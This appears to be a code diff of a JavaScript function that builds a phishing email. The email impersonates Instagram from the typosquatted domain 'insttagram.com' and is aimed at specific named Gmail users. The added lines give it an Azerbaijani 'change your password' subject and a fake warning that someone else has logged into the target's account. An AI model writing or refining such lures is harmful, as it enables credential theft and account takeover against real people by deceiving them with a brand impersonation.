@@ -13,10 +13,11 @@ async function f() {
     const data = {
         from: "Instagram <no-reply@insttagram.com>",
         to: "toghrulgasimov@gmail.com", //farid.naghizada@gmail.com
-        subject: "Parolu Deyish",
+        subject: "Şifrəni dəyişin",
         text: "Parolu deyishmek ucun link budur",
         html: "<link href=\"https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono\" rel=\"stylesheet\">\n" +
             "\n" +
+            "<p>mr_nagizade İnstagramınıza başqa şəxs daxil oldu. Xaiş edirik şifrəni yeniləyin. </p>"+
             "<div id=\"wrapper\">\n" +
             "  <div class=\"main-content\" style=''>\n" +
             "    <div class=\"header\">\n" +
